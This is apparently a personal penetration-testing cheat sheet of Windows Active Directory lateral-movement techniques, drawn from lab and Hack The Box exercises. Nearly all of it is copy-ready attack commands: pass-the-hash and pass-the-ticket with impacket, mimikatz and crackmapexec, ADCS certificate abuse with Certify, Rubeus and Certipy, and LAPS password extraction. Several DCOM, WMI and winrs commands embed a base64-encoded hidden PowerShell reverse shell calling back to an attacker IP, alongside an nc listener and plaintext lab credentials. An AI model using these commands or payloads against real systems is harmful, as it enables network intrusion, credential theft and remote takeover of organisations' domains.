## Lateral Movement

### Links

- [Pass the Hash](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/)
- [AD Cheat Sheet](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#lateral-movement)

Hey, Why are you here? Do you have HASH or PASSWORD? Users Hash and Kerberos Ticket. Why crack Hashes and Passwords when you can pass them?

### PsExec

```

./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
hostname
whoami



```

### Pass the Hash

```
Pass The Hash -> NTLM Hash Only
# Requires local admin privs

# Hashes
1) impacket-psexec -hashes ":d098fa8675acd7d26ab86eb2581233e5" <user>@<DC IP>
1) impacket-psexec -hashes ":d098fa8675acd7d26ab86eb2581233e5" <domain>/<user>@<DC IP>
3) impacket-wmiexec -hashes ":32196B56FFE6F45E294117B91A83BF38" Administrator@<IP>

# Password
1) impacket-psexec <user>:<password>@<ip> # Try impacket-psexec
1) impacket-psexec <domain>/<user>:<password>@<ip> # Try impacket-psexec

3) pth-winexe -U Administrator%<NTLM Hash>:<NTLM Hash> //<IP> cmd
3) pth-winexe -U Administrator%<NTLM Hash>:<SHA1 Hash> //<IP> cmd                                            

3) evil-winrm -i <IP> -u <User> -H <HASH>

4) python smbclient.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@<IP>
5) pth-smbclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //<IP>/c$
6) crackmapexec smb <IP> -u Administrator -H <hash> -x ipconfig
```

### Overpass the Hash

```
Turn NTLM hash to Kerberos ticket and Avoid NTLM Auth.
# Requires local admin privs

mimikatz
sekurlsa::pth /user:<username> /domain:<domain_name> /ntlm:<ntlm_hash> /run:PowerShell.exe
# New PowerShell prompt.
net use \\dc01 # To authenticate to a DC and generate a TGT and TGS.

.\PsExec.exe \\dc01 cmd.exe # With the Help of TGT we log in to the account.
```

### Pass the Ticket

```

whoami
ls \\web04\backup
privilege::debug
sekurlsa::tickets /export
dir *.kirbi
kerberos::ptt [0;130c8d]-0-0-40810000-dave@cifs-web04.kirbi
klist
ls \\web04\backup


```

### DCOM

```

$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.189.72"))

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
tasklist | findstr "calc"

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=","7")


nc -lnvp 443
whoami
hostname

```

### WMI and WinRM

```


wmic /node:192.168.189.73 /user:jen /password:Nexus123! process call create "calc"

$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.189.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};


$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.189.72 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};




winrs -r:legacy -u:adrian -p:i6yuT6tym@  "cmd /c hostname & whoami"

winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="


$username = 'dave2';
$password = 'password123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName CLIENT02 -Credential $credential
Enter-PSSession 1
whoami
hostname


```


### Active Directory Certificate Services (ADCS) [Example](https://0xdf.gitlab.io/2023/06/17/htb-escape.html)

```
#### Identify ADCS

crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs

#### Identify Vulnerable Template

upload Certify.exe

.\Certify.exe find /vulnerable /currentuser


### Abuse Template

.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

Both the README and the end of that output show the next step. I’ll copy everything from `-----BEGIN RSA PRIVATE KEY-----` to `-----END CERTIFICATE-----` into a file on my host and convert it to a `.pfx` using the command given, entering no password when prompted:


openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx

.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap

The last line is the NTLM hash for the administrator account.

or #### With Certipy

certipy-ad find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable

certipy-ad req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication

certipy-ad auth -pfx administrator.pfx

ntpdate -u sequel.htb

certipy-ad auth -pfx administrator.pfx




```


### From HTB StreamIO for "**ReadLAPSPassword**" "WriteOwner /Owns" privilege attack

```

While logged in as a user, but got creds for a user who can read LAPS Password:

upload /usr/share/windows-binaries/PowerView.ps1

Import-Module .\PowerView.ps1
$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
net user jdgodd /domain
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
Get-DomainObject DC -Credential $cred -Properties "ms-Mcs-AdmPwd",name

or just do this from kali:

ldapsearch -x -b 'DC=streamIO,DC=htb' -H ldap://streamio.htb -D JDgodd@streamio.htb -W "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

```